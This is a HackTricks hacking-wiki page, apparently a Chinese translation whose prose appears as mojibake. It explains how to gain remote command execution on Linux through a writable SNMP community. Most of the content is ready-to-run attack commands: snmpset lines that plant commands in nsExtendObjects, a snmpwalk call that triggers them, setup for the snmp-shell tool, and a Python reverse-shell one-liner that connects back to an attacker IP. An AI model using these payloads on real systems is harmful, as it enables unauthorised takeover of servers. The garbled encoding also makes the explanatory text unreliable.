{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

# SNMP RCE

å¦‚æœç®¡ç†å‘˜å¿½è§†è®¾å¤‡æˆ–æœåŠ¡å™¨ä¸Šçš„é»˜è®¤é…ç½®ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨SNMPã€‚é€šè¿‡åœ¨Linuxæ“ä½œç³»ç»Ÿä¸Š**æ»¥ç”¨å…·æœ‰å†™æƒé™çš„SNMPç¤¾åŒºï¼ˆrwcommunityï¼‰**ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤ã€‚

## ä½¿ç”¨é™„åŠ å‘½ä»¤æ‰©å±•æœåŠ¡

è¦æ‰©å±•SNMPæœåŠ¡å¹¶æ·»åŠ é¢å¤–å‘½ä»¤ï¼Œå¯ä»¥å°†æ–°**è¡Œé™„åŠ åˆ°â€œnsExtendObjectsâ€è¡¨**ã€‚è¿™å¯ä»¥é€šè¿‡ä½¿ç”¨`snmpset`å‘½ä»¤å¹¶æä¾›å¿…è¦çš„å‚æ•°æ¥å®ç°ï¼ŒåŒ…æ‹¬å¯æ‰§è¡Œæ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œè¦æ‰§è¡Œçš„å‘½ä»¤ï¼š
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
## æ³¨å…¥å‘½ä»¤ä»¥æ‰§è¡Œ

å‘ SNMP æœåŠ¡æ³¨å…¥å‘½ä»¤éœ€è¦è¢«è°ƒç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶/è„šæœ¬çš„å­˜åœ¨å’Œå¯æ‰§è¡Œæ€§ã€‚**`NET-SNMP-EXTEND-MIB`** è¦æ±‚æä¾›å¯æ‰§è¡Œæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚

è¦ç¡®è®¤æ³¨å…¥å‘½ä»¤çš„æ‰§è¡Œï¼Œå¯ä»¥ä½¿ç”¨ `snmpwalk` å‘½ä»¤æšä¸¾ SNMP æœåŠ¡ã€‚**è¾“å‡ºå°†æ˜¾ç¤ºå‘½ä»¤åŠå…¶ç›¸å…³ç»†èŠ‚ï¼ŒåŒ…æ‹¬ç»å¯¹è·¯å¾„ï¼š**
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
## è¿è¡Œæ³¨å…¥çš„å‘½ä»¤

å½“**æ³¨å…¥çš„å‘½ä»¤è¢«è¯»å–æ—¶ï¼Œå®ƒä¼šè¢«æ‰§è¡Œ**ã€‚è¿™ç§è¡Œä¸ºè¢«ç§°ä¸º**`run-on-read()`**ã€‚å¯ä»¥åœ¨snmpwalkè¯»å–æœŸé—´è§‚å¯Ÿåˆ°å‘½ä»¤çš„æ‰§è¡Œã€‚

### ä½¿ç”¨SNMPè·å–æœåŠ¡å™¨Shell

è¦æ§åˆ¶æœåŠ¡å™¨å¹¶è·å¾—æœåŠ¡å™¨Shellï¼Œå¯ä»¥ä½¿ç”¨mxrchå¼€å‘çš„pythonè„šæœ¬ï¼Œåœ°å€ä¸º[**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git)ã€‚

æˆ–è€…ï¼Œå¯ä»¥é€šè¿‡å°†ç‰¹å®šå‘½ä»¤æ³¨å…¥SNMPæ‰‹åŠ¨åˆ›å»ºåå‘Shellã€‚è¿™ä¸ªå‘½ä»¤ç”±snmpwalkè§¦å‘ï¼Œå»ºç«‹ä¸æ”»å‡»è€…æœºå™¨çš„åå‘Shellè¿æ¥ï¼Œä»è€Œå®ç°å¯¹å—å®³è€…æœºå™¨çš„æ§åˆ¶ã€‚æ‚¨å¯ä»¥å®‰è£…è¿è¡Œæ­¤æ‰€éœ€çš„å…ˆå†³æ¡ä»¶ï¼š
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
æˆ–åå‘ shellï¼š
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
## å‚è€ƒæ–‡çŒ®
* [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)


{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
